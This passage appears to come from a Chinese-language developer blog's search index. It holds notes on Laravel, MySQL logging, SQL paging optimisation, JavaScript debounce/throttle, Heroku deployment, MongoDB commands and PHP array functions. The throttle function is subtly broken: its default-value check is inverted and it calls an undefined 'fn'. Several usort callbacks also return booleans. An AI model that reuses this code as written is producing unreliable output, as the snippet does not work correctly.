博客](https://blog.csdn.net/fdipzone/article/details/78659784)\n  pjax\n\n### CDN\n\n[刷新缓存的方法 - 七牛开发者中心](https://developer.qiniu.com/fusion/kb/1325/refresh-the-cache-and-the-effect-of-time)\n\n- [app 接口设计 token 过期怎么使用\\_百度知道](https://zhidao.baidu.com/question/1577731103328450940.html)\n- [php ini - setting max_input_vars PHP.ini directive using ini_set - Stack Overflow](https://stackoverflow.com/questions/9973555/setting-max-input-vars-php-ini-directive-using-ini-set)\n- [Laravel Migration、Model、DB 物件 相關操作 (濃縮) - La Tech.](https://www.latech.tw/2017/02/laravel-migrationmodeldb.html)\n- [Redis 禁用 FLUSHALL FLUSHDB KEYS 命令 - 星瑞 - 博客园](https://www.cnblogs.com/gongxr/p/9522698.html)\n- [Docker 使用 cron 定时任务 - 歪麦博客](https://www.awaimai.com/2615.html)\n- [Laravel 模型关联 attach,save,sync 方法参数类型验证 - Coder_Chang 的博客 - CSDN 博客](https://blog.csdn.net/Coder_Chang/article/details/78815589)\n- [associate 的意义？ | Laravel China 社区](https://learnku.com/laravel/t/17375)\n- [Laravel\\_使用 Passport 寫 API - 總有一天我要當超人](https://g8787856.github.io/2018/06/30/laravel-passport/)\n\n[php - How to save in a polymorphic relationship in Laravel? - Stack Overflow](https://stackoverflow.com/questions/42950104/how-to-save-in-a-polymorphic-relationship-in-laravel)\n[save() on polymorphic relation don't work](https://laracasts.com/discuss/channels/eloquent/save-on-polymorphic-relation-dont-work)\n\n[模型关联 | 《Laravel Nova 中文文档》](https://learnku.com/docs/nova/1.0/model-association/2191#searchable-relations)\n[[5.1] Saving morphTo relation. · Issue #11918 · laravel/framework](https://github.com/laravel/framework/issues/11918)\n[Eloquent 关系图例（译） | Laravel China 社区](https://learnku.com/articles/6874/the-legend-of-eloquent-relations)\n[laravel Carbon 函数 - 醒来明月 - CSDN 博客](https://blog.csdn.net/lbwo001/article/details/53063867)\n[如何使用 K8S 自動化定期 CronJob 抓網路公開資料 | TechBridge 技術共筆部落格](https://blog.techbridge.cc/2019/06/29/how-to-build-kubernetes-k8s-cronjob-crawler/)\n[Kubernetes 中的 Job 和 CronJob，批量任务执行 - mark's technic world - CSDN 博客](https://blog.csdn.net/hxpjava1/article/details/79815015)\n[onlinereadbook/bookdocker: 線上 docker 讀書會](https://github.com/onlinereadbook/bookdocker)\n[Repository Pattern and Service Layer – 佛祖球球](https://blog.johnsonlu.org/repository-pattern-and-service-layer/)\n[Laravel、Ruby on Rails、Django ... 使用 Active Record Pattern 框架的最大問題：到底該把 save 寫在哪裡？ – Devs.tw](https://devs.tw/post/328)\n[批評 Active Record 的13個論點：最好用也最危險的 Anti-pattern | 轉個彎日誌](http://blog.turn.tw/?p=2992)\n[(1) Laravel 台灣](https://www.facebook.com/groups/laravel.tw/permalink/2899482063454157/)","tags":["laravel"],"categories":["Laravel"]},{"title":"MySQL 記錄所有 sql log 方法","url":"%2Fblog%2F2019%2F07%2F11%2FMySQL-%E8%A8%98%E9%8C%84%E6%89%80%E6%9C%89-sql-log-%E6%96%B9%E6%B3%95%2F","content":"\n最近聽說(同事)PHP 用 die 的話，可能不會關掉 PDO 連線\n但聽說規聽說，Google 都沒有爬到，但我覺得這個我可以自己實驗\n\n<!--more-->\n\n## 開 MySQL LOG 方法\n\n有看到`log=/tmp/mysql.log`加在`[mysqld]`就可以了\n但我一直失敗!!\n不知道是不是我電腦是 window 關係\n\n最後找到這篇可以正常執行\n[mysql 在 my.cnf 中配置日志文件路径出错报错:[ERROR] /usr/sbin/mysqld: ambiguous option '--log=/var/lib/mysql/mysql.log' (log-bin, log_slave_updates)](https://www.jonceryang.com/blog/36)\n\n> 解决方法\n> 不要用 log 配置项，改用 general_log，具体配置如下：\n> general_log=ON\n> general_log_file=/tmp/mysql.log\n\n其實這個跟我這次實驗沒關係\n之後想研究 Laravel 想看她的結果\n\n## PDO 查看 prepare SQL log 長什麼樣子\n\n原本就是想開 log 看有沒有執行\n但發現 window 這段就會無效\n有空我再找 linux 電腦測試\n[php - PDO 操作，设置了 ATTR_EMULATE_PREPARES 属性为 false 后发现还是在本地模拟 prepare - SegmentFault 思否](https://segmentfault.com/q/1010000005714538)\n\n## PHP die/exit 會做的事情\n\n經過我測試，die 後會馬上關閉 pdo 連線\n這是為什麼呢?我好奇去官網找一下答案\n\n> Terminates execution of the script. Shutdown functions and object destructors will always be executed even if exit is called.\n> exit is a language construct and it can be called without parentheses if no status is passed.\n\n[PHP: exit - Manual](https://www.php.net/manual/en/function.exit.php)\n\n好了，確定沒有這個問題，可以放心的使用這個東西\n","tags":["log"],"categories":["SQL"]},{"title":"SQL JOIN LIMIT 表做查詢優化","url":"%2Fblog%2F2019%2F07%2F10%2FSQL-JOIN-LIMIT-%E8%A1%A8%E5%81%9A%E6%9F%A5%E8%A9%A2%E5%84%AA%E5%8C%96%2F","content":"\n最近公司上線 APP 的某一筆資料原本要做例外排除\n但是沒有做\n因為這一筆資料會撈出過多的方法\nAPP 已經審查過\n所以沒辦法更動 APP\n只能看有沒有比較優的查詢方法\n但是有網路找到一個方法\n\n<!--more-->\n\n之前就有看過類似方法\n不過都沒有紀錄\n今天遇到，原本想說很複雜的 SQL 可能沒有什麼效果\n但是今天用了一下\n還不錯\n\n> SELECT \\* FROM test AS t\n> INNER JOIN ( SELECT id FROM test ORDER BY post_time DESC LIMIT 15000,10 ) AS s\n> ON t.id=s.id\n> 我相信 , 這道指令應該 1 秒都不用\n> 為何會如此呢 ?\n> 因為我們在 subquery 中只有抓 id , 這樣 mysql 就只需要少量記憶體就可以存放資料列進行排序 , 原始的作法就是每一列有多少資料 , mysql 就必須分配多少記憶體 , 如果資料數太大 , 記憶體不夠分配 , 自然就是用 disk 了\n> 但如果我們要抓的資料只是前面幾筆 , 例如 LIMIT 100,10 , 那麼原本的寫法會比較快 , 因此這可以在程式中判斷而交互使用兩種 QUERY 的方式\n> [善用 sub query 優化 order by limit | 壞蛋的密室](https://www.pigo.idv.tw/archives/390)\n\n```sql\nSELECT\nxxx\nFROM xxx x1\nINNER JOIN  s ON x1.id = s.id\n...\nLEFT JOIN  pl ON pl.id = x1.id\nINNER JOIN (SELECT id FROM pl pl2 WHERE xxx_id IN (\nselect oo FROM ss where oo.id = ___ AND o.condition1 = 1\nAND o.condition2 = 1\n) ORDER BY counts desc limit 0,500) as a ON pl.id = a.id\nWHERE s.id = ___\nAND ...\nORDER BY pl.counts DESC\nLIMIT 0, 500\n```\n\n沒想到這麼複雜 SQL 也可以這麼快\n","tags":["join"],"categories":["SQL"]},{"title":"JavaScript 效能優化 Debounce 和 Throttle 小記","url":"%2Fblog%2F2019%2F07%2F05%2FJavaScript-%E6%95%88%E8%83%BD%E5%84%AA%E5%8C%96-Debounce-%E5%92%8C-Throttle-%E5%B0%8F%E8%A8%98%2F","content":"\n之前在看 Vue 範例就看到有這個 Debounce 函式運用\n就很想做這個筆記\n不過，今天同事有一個同時間觸發同一個 Event\n最後想起一個 workaround 解決方式\n\n<!--more-->\n\n首先，這個一般可以用 jQuery off 方式關掉全部的 Event\n但這個也不是萬靈丹\n在某種情況下還是無法用\n這時候想到這個也能解決這個問題\n\n不過因為他那個按鈕(開關套件)，不能同時按，因為有做 AJAX 關係\n所以要用 ajax disabled 那個物件，completed 可以 enable\n就能防止 bug\n但能不要用這種方式最好\n\n首先，記錄兩個差異\nDebounce 主要用在事件處發，當下點下去第一下才會處發，後面幾毫秒不會觸發\nThtrottle 主要用在多次刷新，但是不需要太頻繁，通常用在做動畫上面\n\n## Debounce\n\n```js\nfunction debounce(func, delay) {\n  var timer = null;\n  return function() {\n    var context = this;\n    var args = arguments;\n    clearTimeout(timer);\n    timer = setTimeout(function() {\n      func.apply(context, args);\n    }, delay);\n  };\n}\n```\n\n簡單講就是設定\n\n## Throttle\n\n```js\nfunction throttle(func, threshhold) {\n  var last, timer;\n  if (threshhold) threshhold = 250;\n  return function() {\n    var context = this;\n    var args = arguments;\n    var now = +new Date();\n    if (last && now < last + threshhold) {\n      clearTimeout(timer);\n      timer = setTimeout(function() {\n        last = now;\n        func.apply(context, args);\n      }, threshhold);\n    } else {\n      last = now;\n      fn.apply(context, args);\n    }\n  };\n}\n```\n\n[網頁 DOM 事件的效能優化：Debounce 和 Throttle | Mr. Opengate](https://mropengate.blogspot.com/2017/12/dom-debounce-throttle.html) {% asset_link 備份圖 web1.png %}\n[JS 专题之节流函数 - 知乎](https://zhuanlan.zhihu.com/p/52249747)\n\n## 第三方套件 Debounce、Throttle\n\n### Lodash\n\n推薦使用這個!!\nhttps://lodash.com/\n\n### Underscore\n\nhttp://underscorejs.org/\n"},{"title":"php switch, if, 陣列套用方法比較","url":"%2Fblog%2F2019%2F07%2F04%2Fphp-Switch-if-%E9%99%A3%E5%88%97%E5%A5%97%E7%94%A8%E6%96%B9%E6%B3%95%E6%AF%94%E8%BC%83%2F","content":"\n最近聽到 PHP 盡量不要用 switch 做條件\n用 array 方式比較快!!\n網路上很多都是比較 switch, if\n當下就好奇了一下，修改遺下看秒數\n\n<!--more-->\n\n## if,switch 比較\n\n[Jiahe Jou: [轉錄] PHP - if v.s. switch 誰快?](http://joujiahe.blogspot.com/2011/09/php-if-vs-switch.html)\n\n當下修正\n[Online PHP editor | output for t8CM0](https://3v4l.org/t8CM0)\n\n```\nOutput for 7.3.5\n    Performance Testing PHP if / else VS switch with 100,000 iterations\n\n    total if / else time: 0.007087230682373\n    total case time: 0.0072040557861328\n    total array time: 0.006603479385376\n```\n\n```\nOutput for 5.6.0\n    Performance Testing PHP if / else VS switch with 100,000 iterations\n\n    total if / else time: 0.035436391830444\n    total case time: 0.026345729827881\n    total array time: 0.046525478363037\n```\n\n可以看出 PHP 7 陣列效能真的快很多了\n\n不過，我覺得還是要看情況用\n不然失去程式可讀性也不是很好\n","tags":["if"],"categories":["PHP"]},{"title":"heroku 架設 PHP & Laravel  小記","url":"%2Fblog%2F2019%2F06%2F30%2Fheroku-%E6%9E%B6%E8%A8%AD-PHP-Laravel-%E5%B0%8F%E8%A8%98%2F","content":"\n最近想寫一些程式放在網路上\n但目前應該只有想測試程式用\n網路有看到 Heroku\n所以今天實作看看\n\n<!--more-->\n\n## 官網教學\n\n[Getting Started on Heroku with PHP | Heroku Dev Center](https://devcenter.heroku.com/articles/getting-started-with-php)\n\n1. 準備\n\n- heroku cli 安裝\n- php\n- composer\n\n2. cli 登入\n\n`heroku login`\n\n3. 安裝測試 project\n\n```bash\ngit clone https://github.com/heroku/php-getting-started.git\ncd php-getting-started\n```\n\n4. 建制部屬分支\n\n```bash\nheroku create\n```\n\n在下這個指令之前\n請看現在`git remote`分支\n只會有一個 master\n但是打了`heroku create`\n會多出一個分支，那個是部屬用的\n\n5. 推送程式上去\n\n```bash\ngit push heroku master\n```\n\n6. `heroku open`指令會跳出瀏覽器，可看到部屬成果\n\n**其實這邊算部屬完了**\n\n7. 看 log\n\n```bash\nheroku logs --tail\n```\n\n8. Procfile 設定\n   其實看教學完後，我一直在想 Heroku 怎麼知道我不屬哪一個程式語言?\n   後來我看到這個，才知道為什麼 Heroku 能跑出我要的東西\n   為什麼自動部屬可以跑 composer?\n   我覺得應該是這個關係 [heroku-buildpack-php/heroku-php-apache2 at master · heroku/heroku-buildpack-php](https://github.com/heroku/heroku-buildpack-php/blob/master/bin/heroku-php-apache2)\n\n```bash\nweb: vendor/bin/heroku-php-apache2 web/\n```\n\n9. 更新現有程式內容\n\n這邊我就不詳細記錄了\n文件建議 vendor 要加在.gititnore 裡面\n\n```bash\ncomposer require ...\ncomposer update\ngit add .\ngit commit -m 'demo'\ngit push heroku master\nheroku open xxx\n```\n\n10 操作 heroku cli\n\nheroku run \"php -a\"\n\n```\nheroku run bash\n```\n\n11. 設定環境變數\n\n```bash\n// 設定環境變數\nheroku config:set TIMES=20\n// 看 heroku env\nheroku config\n```\n\n12. 建置 Postgresql\n\n```bash\nheroku addons:create heroku-postgresql:hobby-dev\n\n```\n\n環境變數會多一個 `DATABASE_URL`\n\n```php\n$dbopts = parse_url(getenv('DATABASE_URL'));\n$app->register(new Csanquer\\Silex\\PdoServiceProvider\\Provider\\PDOServiceProvider('pdo'),\n               array(\n                'pdo.server' => array(\n                   'driver'   => 'pgsql',\n                   'user' => $dbopts[\"user\"],\n                   'password' => $dbopts[\"pass\"],\n                   'host' => $dbopts[\"host\"],\n                   'port' => $dbopts[\"port\"],\n                   'dbname' => ltrim($dbopts[\"path\"],'/')\n                   )\n               )\n);\n\n```\n\n網路也有茶道可以使用[Heroku 連線 Postgresql 教學 ~ 度估記事本](https://daimom3020.blogspot.com/2018/05/heroku-postgresql.html)\n去做 DB 管理\n\n---\n\n小記我 Heroku 有 rails 專案\n\n之前 2014 年有參加 rails 新手活動\n結果我今天用都忘記我有用過這個...\n\n要怎麼把上面舊專案下載下來呢\n\n```bash\nheroku git:clone -a heroku_project\n```\n\n## Laravel\n\n之後 Laravel 架設可能需要調整到\n\n1. [如何利用 Heroku 免費將本地 Laravel 專案部署到線上，已解決 - IT 閱讀](https://www.itread01.com/content/1546353248.html)\n2. [laravel-heroku-example/readme.md at master · jessedc/laravel-heroku-example](https://github.com/jessedc/laravel-heroku-example/blob/master/readme.md)\n3. [如何快速使用 Heroku 来部署你的 Laravel 应用 | Laravel China 社区](https://learnku.com/articles/2602/how-to-quickly-use-heroku-to-deploy-your-laravel-application)\n\n先記錄連結，有空寫寫我的部屬過程\n\n## 更多 heroku cli 指令\n\n[Heroku 運行類別、 Procfile、常用指令筆記 | DEVLOG of andyyou](https://andyyou.github.io/2016/10/31/process-types-and-profile/)\n","tags":["deploy"],"categories":["Heroku"]},{"title":"MonogoDB 操作使用小記","url":"%2Fblog%2F2019%2F06%2F30%2FMonogoDB-%E6%93%8D%E4%BD%9C%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98%2F","content":"\n最近專案有用到這個\n有看到使用`Robo 3T`\n但對這一塊不是很了解\n這邊主要是紀錄如何`操作 MonogoDB`\n不會記載 MonogoDB 詳細知識\n\n<!--more-->\n\n## 有哪幾種 NoSQL?(4 種)\n\n- Key-value store\n  ex: BigTable、Hadoop\n- Document store\n  ex: MongoDB\n- Graph\n  ex: Neo4J\n- 列存儲(Wide Column Store/Column-Family)資料庫(記憶體資料庫是知名網站慣用快取工具)\n  ex: Memcached、Redis、Velocity\n\n[快速認識 4 類主流 NoSQL 資料庫 | iThome](https://www.ithome.com.tw/news/92507)\n\n## 簡單架設 MonogoDB\n\n### docker 架設\n\n[參考裡面 docker-compose.yml](https://hub.docker.com/_/mongo)\n\n### vagrant\n\nhomestead 可以架設\n\n或者比較單純[Vagrant box benson/mongodb - Vagrant Cloud](https://app.vagrantup.com/benson/boxes/mongodb) 或 [Update to Mongo v3 · Issue #5 · bobthecow/vagrant-mongobox](https://github.com/bobthecow/vagrant-mongobox/issues/5)\n\n## 操作使用\n\n### local,config,admin databases\n\n預設安裝完會看到有三個 database\n`local`,`config`,`admin` 三個 database 建議不要去動他\n\n> admin and local contain various settings local to the server, like users who are authenticated to connect. Under beginner usage, you shouldn't need to worry about them at all. By default you connect to a database named test. To connect to a new database, just use databasename from the mongo command line, or mongo databasename from your OS shell.\n> use [database_name] and then show collections\n> The db object is your root handle to the currently-selected database on the mongo commmand line. The command line is really just a Javascript command line, and there are various mongodb-specific objects and functions exposed that let you do stuff. Try help() for a full listing.\n\n[Some beginner's questions about MongoDB - Stack Overflow](https://stackoverflow.com/questions/3490272/some-beginners-questions-about-mongodb)\n[MongoDB 管理：慎用 local、admin 数据库 | MongoDB 中文社区](http://www.mongoing.com/archives/2599)\n\n## mysql <=> mongodb\n\nMySQL MongoDB\nTable <==> Collection\nRow <=> Document\nColumn <=> Field\n\n[MongoDB and MySQL Compared | MongoDB](https://www.mongodb.com/compare/mongodb-mysql)\n\n## 操作使用\n\n### 創建資料庫\n\n`use DATABASE_NAME`\n\n如果資料庫不存在，則創建資料庫，否則切換到指定資料庫。\n\n### 刪除資料庫\n\n`db.dropDatabase()`\n\n刪除所在的 Database\n\n### 创建集合(Collection)\n\n`db.createCollection(name, options)`\n\n`db.createCollection(\"mycol\", { capped : true, autoIndexId : true, size : 6142800, max : 10000 }`\n創建固定集合 mycol，整個集合空間大小 6142800 KB, 文檔最大個數為 10000 個。\n\n### 插入文件(Document)\n\n`db.COLLECTION_NAME.insert(document)`\n\n```js\ndb.col.insert({\n  title: \"MongoDB 教程\",\n  description: \"MongoDB 是一個 Nosql 數據庫\",\n  by: \"菜鳥教程\",\n  url: \"http://www.runoob.com\",\n  tags: [\"mongodb\", \"database\", \"NoSQL\"],\n  likes: 100\n});\n```\n\n### 查詢集合\n\n`db.col.find()`\n\n### 刪除文件\n\n```js\ndb.collection.remove(\n   <query>,\n   <justOne>\n)\n```\n\n[MongoDB 刪除文檔 | 菜鳥教程](http://www.runoob.com/mongodb/mongodb-remove.html)\n\n```\nremove() 方法已經過時了，現在官方推薦使用 deleteOne() 和 deleteMany() 方法。\n\n如刪除集合下全部文檔：\n\ndb.inventory.deleteMany({})\n\n刪除 status 等於 A 的全部文檔：\n\ndb.inventory.deleteMany({ status : \"A\" })\n\n刪除 status 等於 D 的一個文檔：\n\ndb.inventory.deleteOne( { status: \"D\" } )\n\n三國電視台\n\n   三國電視台\n\n  tre***3@126.com\n2年前 (2017-09-22)\n\n   sairre\n\n  jsa***e@163.com\n\nremove() 方法 並不會真正釋放空間。\n\n需要繼續執行 db.repairDatabase() 來回收磁盤空間。\n\n> db.repairDatabase()\n或者\n> db.runCommand({ repairDatabase: 1 })\n```\n\n### 修改文件\n\n```js\ndb.collection.update(\n   <query>,\n   <update>,\n   {\n     upsert: <boolean>,\n     multi: <boolean>,\n     writeConcern: <document>\n   }\n)\n```\n\n```\n在3.2版本开始，MongoDB提供以下更新集合文档的方法：\n\n    db.collection.updateOne() 向指定集合更新单个文档\n    db.collection.updateMany() 向指定集合更新多个文档\n```\n\n更多內容可看[MongoDB 教程 | 菜鸟教程](http://www.runoob.com/mongodb/mongodb-tutorial.html)\n由於裡面教學應該是 2.x 版\n可以看評論裡面補充很多東西\n\n## Robo 3T 操作 MongoDB\n\n[MongoDB 可视化工具--Robo 3T 使用教程 - 龙恩 0707 - 博客园](https://www.cnblogs.com/tugenhua0707/p/9250673.html)\n[adminMongo](https://adminmongo.markmoffat.com/)\n\n## 刪除資料 OR 篩選資料 的問題\n\n[「乾貨」mongoDB 釋放磁碟占用 - 每日頭條](https://kknews.cc/zh-tw/news/kyyva3q.html)\n目前專案裡面放的資料好像不會去做刪除或者撈出來資料不會做篩選\n不知道是不是非常耗效能關係??\n","tags":["monogodb"],"categories":["MongoDB"]},{"title":"PHP 陣列實用函式小記","url":"%2Fblog%2F2019%2F06%2F29%2FPHP-%E9%99%A3%E5%88%97%E5%AF%A6%E7%94%A8%E6%B6%B5%E5%BC%8F%E5%B0%8F%E8%A8%98%2F","content":"\n寫了 PHP 一陣子\nPHP array function 非常多\n所以不是很熟\n最近做案子有用到一些實用的\n做一下筆記，方便快速尋找\n\n<!--more-->\n\n## array_chunk\n\n陣列切割多個區塊函式\n簡單說明一下，有時候需要多批陣列\n這時候就用得到這個函式\n`array_chunk ( array $array , int $size [, bool $preserve_keys = FALSE ] ) : array`\n第三個參數是否要保留 key\n[PHP: array_chunk - Manual](https://www.php.net/manual/en/function.array-chunk.php)\n\n```php\n<?php\n\nfunction partition( $list, $p ) {\n    $listlen = count( $list );\n    $partlen = floor( $listlen / $p );\n    $partrem = $listlen % $p;\n    $partition = array();\n    $mark = 0;\n    for ($px = 0; $px < $p; $px++) {\n        $incr = ($px < $partrem) ? $partlen + 1 : $partlen;\n        $partition[$px] = array_slice( $list, $mark, $incr );\n        $mark += $incr;\n    }\n    return $partition;\n}\n\n$citylist = array( \"Black Canyon City\", \"Chandler\", \"Flagstaff\", \"Gilbert\", \"Glendale\", \"Globe\", \"Mesa\", \"Miami\",\n                   \"Phoenix\", \"Peoria\", \"Prescott\", \"Scottsdale\", \"Sun City\", \"Surprise\", \"Tempe\", \"Tucson\", \"Wickenburg\" );\nprint_r( partition( $citylist, 3 ) );\n\n?>\n```\n\n剛好官網看到很有趣的寫法\npartition 決定個數，依照陣列做切割\n感覺有機會用到\n\n## array_column\n\n對二維陣列對裡面第一層抓取 key 資料出來。\n\n`array_column ( array $input , mixed $column_key [, mixed $index_key = null ] ) : array`\n\n感覺很適合 Database 搜尋出來資料，抓取部分欄位。\n這時可以用 array_filter,array_unique,array_values 做整理。\n相當實用!!\n\n[PHP: array_column - Manual](https://www.php.net/manual/zh/function.array-column.php)\n\n當然用途還滿多了，第一個能對**isset,**get 模術方法去抓資料\n\n## array_count_value\n\n`array_count_values ( array $array ) : array`\n統計數組中所有的值\n\n```php\n<?php\n$array = array(1, \"hello\", 1, \"world\", \"hello\");\nprint_r(array_count_values($array));\n// Array\n// (\n//     [1] => 2\n//     [hello] => 2\n//     [world] => 1\n// )\n?>\n```\n\n[PHP: array_count_values - Manual](https://www.php.net/manual/zh/function.array-count-values.php)\n\n## array_diff\n\n`array_diff ( array $array1 , array $array2 [, array $... ] ) : array`\n\n對比 array1 和其他一個或者多個數組，返回在 array1 中但是不在其他 array 裡的值。\n\n目前沒什麼用到，但感覺還是有用處的...\n\n## array_fill\n\n`array_fill ( int $start_index , int $num , mixed $value ) : array`\n\n填充陣列用的函式。\n\n[PHP: array_fill - Manual](https://www.php.net/manual/zh/function.array-fill.php)\n\n## array_filter\n\n`array_filter ( array $array [, callable $callback [, int $flag = 0 ]] ) : array`\n\n過濾陣列(自定)函式。\n\n我覺得還滿實用的!!\n當 callback 沒有設定，預設 null, ''(空字串)都會被清除\n相當實用!!!\n\n> callback\n> 使用的回调函数\n\n如果没有提供 callback 函数， 将删除 array 中所有等值为 FALSE 的条目。更多信息见转换为布尔值。\n\n```php\n<?php\n\n$arr = ['a' => 1, 'b' => 2, 'c' => 3, 'd' => 4];\n\nvar_dump(array_filter($arr, function($k) {\n    return $k == 'b';\n}, ARRAY_FILTER_USE_KEY));\n\nvar_dump(array_filter($arr, function($v, $k) {\n    return $k == 'b' || $v == 4;\n}, ARRAY_FILTER_USE_BOTH));\n?>\n// array(1) {\n//   [\"b\"]=>\n//   int(2)\n// }\n// array(2) {\n//   [\"b\"]=>\n//   int(2)\n//   [\"d\"]=>\n//   int(4)\n// }\n```\n\n## array_flip\n\n陣列 key 跟 value 做交換\n\n`array_flip ( array $array ) : array`\n\n算是滿實用的函式。\n\n## array_push & \\$var[]\n\n`array_push ( array &$array , mixed $value1 [, mixed $... ] ) : int`\n回傳 增加數量。\n\n但還是推薦使用`$var[]`\n\n### array_unshift\n\n跟上一個`array_push`很像，但他是加在陣列前面\n\n```php\n<?php\n$queue = array(\"orange\", \"banana\");\narray_unshift($queue, \"apple\", \"raspberry\");\nprint_r($queue);\n?>\n// Array\n// (\n//     [0] => apple\n//     [1] => raspberry\n//     [2] => orange\n//     [3] => banana\n// )\n```\n\n### array_pop\n\n移除(回傳)後面陣列\n\n### array_shift\n\n移除(回傳)前面陣列\n\n## array_rand\n\n`array_rand ( array $array [, int $num = 1 ] ): mixed`\n\n隨機回傳陣列，第二個陣列可以回傳隨機個數\n\n感覺實用!!\n\n## array_slice\n\n`array_slice ( array $array , int $offset [, int $length = NULL [, bool $preserve_keys = false ]] ) : array`\n\n從陣列中取出一段。\n\n比較特別的是 `$offset`,`$length` 可以用負數，為負數代表就是抓取後面位置\n`$offset`,`$length` 可容錯，不會有溢位的問題!!相當時用\n\n**2019-07-01**\n今天做這個有 index(key)容錯\n假如長度少於 key 內容，會取出陣列最後面一個位置\n算是滿好用。\narray_unique 後可以省略做 array_values\n直接做 array_slice\n真的非常方便\n\narray_unique 也可以比對整個 array,object\n`sort($arr, SORT_STRING);`\n原理如下網站\n[PHP 排序模式 SORT_NUMERIC / SORT_STRING / SORT_NATURAL 详解](https://segmentfault.com/a/1190000018487764) {% asset_link web1.png 備份圖 %}\n\n## array_splice\n\n`array_splice ( array &$input , int $offset [, int $length = count($input) [, mixed $replacement = array() ]] ) : array`\n\n## array_sum\n\n把所有陣列做加總。\n\n## array_search\n\n`array_search ( mixed $needle , array $haystack [, bool $strict = FALSE ] ) : mixed`\n\n陣列搜尋，會回傳找到的~~位置~~正確說是 key 值。\n\n### 多維度搜尋\n\n跟 array_search 神搭配\n\n```php\n// $userdb=Array\n// (\n//     (0) => Array\n//         (\n//             (uid) => '100',\n//             (name) => 'Sandra Shush',\n//             (url) => 'urlof100'\n//         ),\n\n//     (1) => Array\n//         (\n//             (uid) => '5465',\n//             (name) => 'Stefanie Mcmohn',\n//             (pic_square) => 'urlof100'\n//         ),\n\n//     (2) => Array\n//         (\n//             (uid) => '40489',\n//             (name) => 'Michael',\n//             (pic_square) => 'urlof40489'\n//         )\n// );\n\n\n$key = array_search(40489, array_column($userdb, 'uid'));\n```\n\n### 查詢最後一個 key\n\n```php\narray_search('green', array_reverse($array));\n```\n\n- [How do I find last occurence of \"needle\" in array php - Stack Overflow](https://stackoverflow.com/questions/21223286/how-do-i-find-last-occurence-of-needle-in-array-php)\n\n## array_unique\n\n`array_unique ( array $array [, int $sort_flags = SORT_STRING ] ) : array`\n\n> sort_flags\n>\n> 第二個可選參數 sort_flags 可用於修改排序行為：\n>\n> 排序類型標記：\n> SORT_REGULAR - 按照通常方法比較（不修改類型）\n> SORT_NUMERIC - 按照數字形式比較\n> SORT_STRING - 按照字符串形式比較\n> SORT_LOCALE_STRING - 根據當前的本地化設置，按照字符串比較。\n\n**但我覺得注意 array_unique 移除 value，但是不會合併**\n**切記可以需要做 array_value or array_slice**\n**切記可以需要做 array_value or array_slice**\n**切記可以需要做 array_value or array_slice**\n\n也非一定要用上面兩個\n可以做`foreach`\n但是做`for($i = 0;$i < count(xxx); $i++)` (PS: $cnt = count(xxx); for($i = 0; $i < $cnt; \\$i++>)會比較好)\n可能需要注意會有問題!!!\n\n### 類似對二維陣列做 array_column 方法\n\n```php\n<?php\n$details = array(\n    0 => array(\"id\"=>\"1\", \"name\"=>\"Mike\",    \"num\"=>\"9876543210\"),\n    1 => array(\"id\"=>\"2\", \"name\"=>\"Carissa\", \"num\"=>\"08548596258\"),\n    2 => array(\"id\"=>\"1\", \"name\"=>\"Mathew\",  \"num\"=>\"784581254\"),\n);\n\nfunction unique_multidim_array($array, $key) {\n    $temp_array = array();\n    $i = 0;\n    $key_array = array();\n\n    foreach($array as $val) {\n        if (!in_array($val[$key], $key_array)) {\n            $key_array[$i] = $val[$key];\n            $temp_array[$i] = $val;\n        }\n        $i++;\n    }\n    return $temp_array;\n}\n\n$details = unique_multidim_array($details,'id');\n\n// $details = array(\n//     0 => array(\"id\"=>\"1\",\"name\"=>\"Mike\",\"num\"=>\"9876543210\"),\n//     1 => array(\"id\"=>\"2\",\"name\"=>\"Carissa\",\"num\"=>\"08548596258\"),\n// );\n?>\n```\n\n## array_values\n\n我以為有排序合併效果，但是沒有!!\n\n詳細看官往範例\n\n```php\n<?php\n$a = array(\n3 => 11,\n1 => 22,\n2 => 33,\n);\n$a[0] = 44;\n\nprint_r( array_values( $a ));\n// ==>\n// Array(\n//   [0] => 11\n//   [1] => 22\n//   [2] => 33\n//   [3] => 44\n// )\n?>\n```\n\n## array_walk vs array_map\n\n我目前還很少用到這些，不過這個函式也滿像的，所以特別記錄一下。\n\n簡單說最大的差異 array_walk 會回傳 `true`,`false`，array_map 會回傳 callback 傳回去資料\n假如要對原資料變數做更動，使用 array_walk ，**但切記宣告記得在`function callback(&$xxx,...)`**(&符號)\n\n光`&`這點我覺得不是很實用了\n\n詳細：[php array_map 与 array_walk 使用对比 - 偶木 - CSDN 博客](https://blog.csdn.net/u013372487/article/details/51568629)\n\n## in_array\n\n`in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] ) : bool`\n\n跟 array_search 有點像，但 return 回去是 bollean\n詳細可參考：\n\n- [[PHP] in_array 與 array_search 在陣列(Array)中尋找值是否存在 - RicharLin.Tw](https://richarlin.tw/blog/php-in_array-array_search/)\n\n## usort,uksort\n\n自定排序\n\n其實我對 callback 排序記不太住\n\n```php\n//由小排到大\n$arr = [3,1,2,5,4];\nusort($arr,function($a,$b){ return $a > $b}); //大於、負數在前(false)由小排到大\n$arr = [3,1,2,5,4];\nusort($arr,function($a,$b){\n    if($a == $b){\n        return 0;\n    }\n    return $a < $b ? -1 : 1;\n});\n\n//由大排到小\n$arr = [3,1,2,5,4];\nusort($arr,function($a,$b){ return $a < $b}) //小於、正數在前(true)由大排到小\n$arr = [3,1,2,5,4];\nusort($arr,function($a,$b){\n    if($a == $b){\n        return 0;\n    }\n    return $a < $b ? 1 : -1;\n});\n```\n\n- [PHP usort()的使用 - liuj8929 的博客 - CSDN 博客](https://blog.csdn.net/liuj8929/article/details/79214345)\n- [php 陣列排序 usort、uksort 與 sort 函式用法 | 程式前沿](https://codertw.com/%E7%A8%8B%E5%BC%8F%E8%AA%9E%E8%A8%80/222935/)\n- [关于 php 中 usort 函数的解读 - 简书](https://www.jianshu.com/p/4d787d88654d)\n\n### PHP 另類比較方法 <=>\n\n#### 太空船操作符（組合比較符）\n\n太空船操作符用於比較兩個表達式。當$a小於(-1)、等於(0)或大於(1)$b 時它分別返回-1、0 或 1。 比較的原則是沿用 PHP 的常規比較規則進行的。\n\n這方法感覺好記!!!\n但只能用在 PHP 7.1\n\n```php\n<?php // tested on PHP 7.1\n$a = [2, 1, 3, 6, 5, 4, 7];\n$asc = $desc = $a;\nusort($asc, function (int $a, int $b) { return ($a <=> $b); });\nusort($desc, function (int $a, int $b) { return -($a <=> $b); });\nprint_r([ $a, $asc, $desc ]);\n```\n\n- [What is <=> (the 'Spaceship' Operator) in PHP 7? 